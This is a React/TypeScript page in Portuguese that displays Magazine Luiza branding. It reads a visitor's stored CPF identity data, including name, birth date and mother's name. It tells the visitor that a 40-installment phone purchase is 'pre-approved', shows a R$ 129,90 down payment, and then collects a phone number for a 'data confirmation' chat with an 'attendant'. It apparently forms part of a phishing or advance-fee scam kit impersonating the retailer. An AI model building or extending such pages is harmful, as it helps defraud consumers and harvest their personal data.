import { useState, useEffect } from "react";
import { useLocation } from "wouter";
import { CartItem } from "@/types";
import { MessageCircle, Phone, Shield, ShoppingCart } from "lucide-react";

/**
 * Página de Resultado - Pré-aprovação
 * - Exibe mensagem de pré-aprovação
 * - Mostra nome do usuário (da API)
 * - Mostra modelo do celular e valor
 * - Informa sobre confirmação via chat
 * - Solicita telefone do usuário
 */

interface CPFData {
  nome?: string;
  cpf?: string;
  data_nascimento?: string;
  sexo?: string;
  nome_mae?: string;
  [key: string]: unknown;
}

export default function Result() {
  const [, navigate] = useLocation();
  const [cpfData, setCpfData] = useState<CPFData | null>(null);
  const [cartItem, setCartItem] = useState<CartItem | null>(null);
  const [showPhoneModal, setShowPhoneModal] = useState(false);
  const [phone, setPhone] = useState("");

  useEffect(() => {
    const savedCpfData = localStorage.getItem("cpfData");
    const savedCartItem = localStorage.getItem("cartItem");

    if (savedCpfData) {
      setCpfData(JSON.parse(savedCpfData));
    }
    if (savedCartItem) {
      setCartItem(JSON.parse(savedCartItem));
    }

    // Se não tiver dados, redirecionar
    if (!savedCpfData || !savedCartItem) {
      navigate("/cpf");
    }
  }, [navigate]);

  // Formatar telefone enquanto digita
  const formatPhone = (value: string) => {
    const numbers = value.replace(/\D/g, "");
    if (numbers.length <= 2) return numbers;
    if (numbers.length <= 7) return `(${numbers.slice(0, 2)}) ${numbers.slice(2)}`;
    return `(${numbers.slice(0, 2)}) ${numbers.slice(2, 7)}-${numbers.slice(7, 11)}`;
  };

  const handlePhoneChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const formatted = formatPhone(e.target.value);
    if (formatted.length <= 15) {
      setPhone(formatted);
    }
  };

  const isPhoneValid = phone.replace(/\D/g, "").length >= 10;

  const handlePhoneSubmit = () => {
    if (!isPhoneValid) return;
    
    // Salvar telefone no localStorage
    localStorage.setItem("userPhone", phone);
    
    // Redirecionar para página de aguardando atendente
    navigate("/aguardando");
  };

  const installmentValue = cartItem ? Math.round(cartItem.price / 40) : 0;

  if (!cpfData || !cartItem) {
    return null;
  }

  return (
    <div className="min-h-screen bg-gradient-to-br from-[#00A650] to-[#008040]">
      {/* Success Header */}
      <div className="px-4 pt-10 pb-6 text-center text-white">
        {/* Magalu Logo */}
        <div className="w-32 h-20 mx-auto mb-4">
          <img 
            src="/images/magalu-logo.png" 
            alt="Magazine Luiza" 
            className="w-full h-full object-contain"
          />
        </div>

        <h1 className="text-2xl font-bold mb-2">
          Parabéns! Seu parcelamento está pré-aprovado!
        </h1>
      </div>

      {/* User Info Card */}
      <div className="px-4 pb-4">
        <div className="bg-white rounded-2xl p-4 shadow-lg">
          {/* User Name */}
          <div className="text-center mb-4 pb-4 border-b border-gray-100">
            <p className="text-sm text-gray-500 mb-1">Cliente</p>
            <h2 className="text-xl font-bold text-gray-800">
              {cpfData.nome || "Cliente"}
            </h2>
          </div>

          {/* Product Info */}
          <div className="flex gap-4 mb-4 pb-4 border-b border-gray-100">
            <img
              src={cartItem.image}
              alt={cartItem.productName}
              className="w-20 h-20 object-contain bg-gray-50 rounded-lg"
            />
            <div className="flex-1">
              <p className="text-sm text-gray-500 mb-1">Produto selecionado</p>
              <h3 className="font-bold text-gray-800">{cartItem.productName}</h3>
              <p className="text-xs text-gray-500">Cor: {cartItem.color}</p>
            </div>
          </div>

          {/* Entrada Mínima */}
          <div className="bg-blue-50 rounded-lg p-3 mb-4">
            <div className="flex items-center justify-between mb-2">
              <span className="text-sm font-semibold text-gray-800">Entrada mínima:</span>
              <span className="text-lg font-bold text-[#0086FF]">R$ 129,90</span>
            </div>
            
            {/* Régua de porcentagem */}
            {(() => {
              const entradaMinima = 129.90;
              const porcentagem = Math.ceil((entradaMinima / cartItem.price) * 100);
              return (
                <div>
                  <div className="flex items-center justify-between text-xs text-gray-500 mb-1">
                    <span>Porcentagem do valor total</span>
                    <span className="font-semibold text-[#00A650]">{porcentagem}%</span>
                  </div>
                  <div className="w-full bg-gray-200 rounded-full h-2.5">
                    <div 
                      className="bg-gradient-to-r from-[#00A650] to-[#00C853] h-2.5 rounded-full transition-all duration-300" 
                      style={{ width: `${Math.min(porcentagem, 100)}%` }}
                    />
                  </div>
                </div>
              );
            })()}
          </div>

          {/* Price Info */}
          <div className="text-center mb-4 pb-4 border-b border-gray-100">
            <p className="text-sm text-gray-500 mb-1">Valor do parcelamento</p>
            <div className="flex items-baseline justify-center gap-1">
              <span className="text-3xl font-bold text-[#E83E8C]">
                40x de R$ {installmentValue.toLocaleString("pt-BR")}
              </span>
            </div>
            <p className="text-sm text-gray-500 mt-1">sem juros</p>
            <p className="text-lg font-semibold text-gray-700 mt-2">
              Total: R$ {cartItem.price.toLocaleString("pt-BR")}
            </p>
          </div>

          {/* Next Steps */}
          <div className="bg-blue-50 rounded-xl p-4 mb-4">
            <div className="flex items-start gap-3">
              <MessageCircle className="w-6 h-6 text-[#0086FF] flex-shrink-0 mt-0.5" />
              <div>
                <h4 className="font-bold text-gray-800 mb-1">Próximo passo</h4>
                <p className="text-sm text-gray-600">
                  Para finalizar a aprovação do seu parcelamento, você precisará passar por uma 
                  <strong> confirmação de dados via CHAT</strong> com um de nossos atendentes.
                </p>
              </div>
            </div>
          </div>

          {/* CTA Button - Dentro do card, logo abaixo do próximo passo */}
          <button
            onClick={() => setShowPhoneModal(true)}
            className="w-full py-4 magalu-btn-green rounded-xl font-bold text-lg flex items-center justify-center gap-2 shadow-lg"
          >
            <ShoppingCart className="w-5 h-5" />
            Continuar compra
          </button>
        </div>
      </div>

      {/* Security Info */}
      <div className="px-4 pb-6">
        <div className="flex items-center justify-center gap-2 text-white/70">
          <Shield className="w-4 h-4" />
          <span className="text-xs">Atendimento seguro e verificado</span>
        </div>
      </div>

      {/* Phone Modal */}
      {showPhoneModal && (
        <div className="fixed inset-0 bg-black/50 flex items-center justify-center p-4 z-50">
          <div className="bg-white rounded-2xl p-6 max-w-sm w-full">
            <div className="text-center mb-4">
              <div className="w-14 h-14 bg-[#0086FF] rounded-full flex items-center justify-center mx-auto mb-3">
                <Phone className="w-7 h-7 text-white" />
              </div>
              <h3 className="text-xl font-bold text-gray-800 mb-1">
                Informe seu telefone
              </h3>
              <p className="text-sm text-gray-600">
                Nosso atendente entrará em contato com você
              </p>
            </div>

            <div className="mb-4">
              <input
                type="tel"
                value={phone}
                onChange={handlePhoneChange}
                placeholder="(00) 00000-0000"
                className="w-full px-4 py-4 text-xl text-center font-mono border-2 border-gray-300 rounded-xl focus:ring-2 focus:ring-[#0086FF] focus:border-[#0086FF] transition-all"
              />
            </div>

            <button
              onClick={handlePhoneSubmit}
              disabled={!isPhoneValid}
              className={`w-full py-3 rounded-xl font-bold text-lg ${
                isPhoneValid
                  ? "magalu-btn-green"
                  : "bg-gray-300 text-gray-500 cursor-not-allowed"
              }`}
            >
              Continuar
            </button>

            <button
              onClick={() => setShowPhoneModal(false)}
              className="w-full py-2 mt-2 text-gray-500 text-sm"
            >
              Cancelar
            </button>
          </div>
        </div>
      )}
    </div>
  );
}
